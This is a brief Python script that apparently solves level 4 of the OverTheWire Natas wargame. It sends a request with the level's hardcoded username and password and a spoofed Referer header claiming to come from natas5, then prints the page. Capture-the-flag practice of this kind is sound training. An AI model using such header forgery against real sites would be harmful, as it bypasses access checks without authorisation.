#!/usr/bin/env python
import requests
username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

url = 'http://%s.natas.labs.overthewire.org/' % username
response = requests.get(url, auth=(username, password), headers={"Referer": "http://natas5.natas.labs.overthewire.org/"})

content = response.text
print(content)
